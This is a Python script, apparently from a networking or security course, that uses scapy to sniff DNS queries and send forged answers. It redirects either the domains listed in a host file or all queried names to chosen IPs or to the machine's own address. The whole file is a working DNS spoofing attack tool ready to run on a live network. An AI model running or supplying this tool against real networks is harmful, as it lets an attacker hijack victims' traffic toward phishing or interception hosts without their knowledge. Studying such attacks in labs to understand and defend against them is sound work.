import argparse
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
hostdict = {}

def parser():
	parser = argparse.ArgumentParser(add_help = False)
	parser.add_argument("-i", nargs = '?')
	parser.add_argument("-h", nargs = '?')
	parser.add_argument("exp", nargs = '*')
	arg = parser.parse_args()

	return arg.i, arg.h, arg.exp
	
def local_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		s.connect(('8.8.8.8', 53))
	except socket.error:
		return None
	return s.getsockname()[0]
	
def fileread(hostfile):
	hostdict = {}
	f = open(hostfile, 'r')
	for line in f:
		hostlist = line.split()
		hostdict[hostlist[1]] = hostlist[0]
	return hostdict

#print local_ip()
#Reference: http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html

def spoof(pkt):
	redirect_to = local_ip()
	#print flagh
	if flagh == 1:
		
		if pkt.haslayer(DNSQR) and pkt[DNS].qr==0 and pkt[DNS].ancount == 0 and (pkt[DNSQR].qname.decode('ASCII')[:-1] in hostdict.keys()):
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
							  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
									  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
									  an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, \
rdata = hostdict[pkt[DNSQR].qname.decode('ASCII')[:-1]])) 
			send(spoofed_pkt)
			print('Sent')
	else:
		if pkt.haslayer(DNSQR) and pkt[DNS].qr==0: # DNS question record 0 = query, 1 = reply
	#print(pkt.summary())
				spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
							  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
									  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
									  an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata = redirect_to))
				send(spoofed_pkt)
				print('Sent')

if __name__ == '__main__':
	#hostdict = file_read()
	interface, hostfile, expression = parser()
	#print(interface)
	if interface:
		flagi = 1
	else:
		flagi = 0
	if hostfile:
		flagh = 1
		hostdict = fileread(hostfile)
	else:
		flagh = 0
	exp = '';
	for str in expression:
		exp = exp+' '+str
	if (flagi == 1):
		sniff(filter = exp, iface = interface, prn = spoof, store = 0)
		
	else:	
		sniff(filter = exp, prn = spoof, store = 0)






